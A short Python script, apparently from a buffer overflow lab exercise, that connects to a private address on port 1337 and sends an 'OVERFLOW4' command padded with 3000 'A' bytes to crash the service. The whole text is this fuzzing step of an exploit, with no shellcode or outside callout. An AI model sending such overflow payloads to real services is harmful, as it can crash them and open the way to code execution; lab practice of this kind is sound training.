import socket, struct
host, port ='10.10.60.7', 1337
command = b'OVERFLOW4 '
payload = b''.join([command,
b'A' * 3000,

])
with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)

